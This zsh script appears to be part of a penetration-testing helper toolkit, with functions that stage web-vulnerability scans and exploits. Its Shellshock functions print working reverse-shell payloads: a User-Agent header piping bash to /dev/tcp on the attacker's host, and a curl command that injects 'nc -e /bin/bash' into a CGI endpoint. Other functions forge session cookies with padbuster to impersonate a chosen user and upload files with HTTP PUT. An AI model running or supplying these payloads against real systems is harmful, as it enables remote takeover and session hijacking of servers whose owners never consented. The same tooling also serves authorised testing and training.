#!/usr/bin/env zsh

############################################################# 
# qq-enum-web-vuln
#############################################################

qq-enum-web-vuln-help() {
  cat << "DOC"

qq-enum-web-vuln
----------------
The enum-web-vuln namespace contains commands for discovering web vulnerabilities.

Commands
--------
qq-enum-web-vuln-install:              installs dependencies
qq-enum-web-vuln-nikto:                scan a target for web vulnerabilities   
qq-enum-web-vuln-nmap-rfi:             scan for potential rfi uri's
qq-enum-web-vuln-shellshock-agent:     create a shellshock payload for user-agent
qq-enum-web-vuln-shellshock-nc:        attempt shellshock with a reverse shell payload
qq-enum-web-vuln-put-curl:             attempt to PUT a file with curl
qq-enum-web-vuln-padbuster-check:      test for padbuster
qq-enum-web-vuln-padbuster-forge:      exploit with padbuster

DOC
}

qq-enum-web-vuln-install() {

  __pkgs nikto curl nmap padbuster
  
}

qq-enum-web-vuln-nikto() {
  __check-project
  qq-vars-set-url
  print -z "nikto -useragent \"${__UA}\" -h \"${__URL}\" -o $(__urlpath)/nikto.txt"
}

qq-enum-web-vuln-nmap-rfi() {
  qq-vars-set-rhost
  print -z "nmap -vv -n -Pn -p80 --script http-rfi-spider --script-args http-rfi-spider.url='/' ${__RHOST}"
}

qq-enum-web-vuln-shellshock-agent() {
  qq-vars-set-lhost
  qq-vars-set-lport
    __ok "Copy the header value below to use in your exploit"
    cat << DOC

User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/${__LHOST}/${__LPORT} 0>&1

DOC
}

qq-enum-web-vuln-shellshock-nc() {
  qq-vars-set-lhost
  qq-vars-set-lport
  qq-vars-set-rhost
  __warn "Start a netcat listener for ${__LHOST}:${__LPORT}"
  print -z "curl -A '() { :; }; /bin/bash -c \"/usr/bin/nc ${__LHOST} ${__LPORT} -e /bin/bash\"' \"http://${__RHOST}/cgi-bin/status\""
}

qq-enum-web-vuln-put-curl() {
  qq-vars-set-rhost
  local f && __askpath f FILE $(pwd)
  print -z "curl -L -T ${f} \"http://${__RHOST}/${f}\" "
}

qq-enum-web-vuln-padbuster-check() {
  qq-vars-set-rhost
  local cn && __askvar cn "COOKIE NAME"
  local cv && __askvar cv "COOKIE VALUE"
  print -z "padbuster ${__RHOST} ${cv} 8 -cookies ${cn}=${cv} -encoding 0"
}

qq-enum-web-vuln-padbuster-forge() {
  qq-vars-set-rhost
  local cn && __askvar cn "COOKIE NAME"
  local cv && __askvar cv "COOKIE VALUE"
  __check-user
  print -z "padbuster ${__RHOST} ${cv} 8 -cookies ${cn}=${cv} -encoding 0 -plaintext user=${__USER}"
}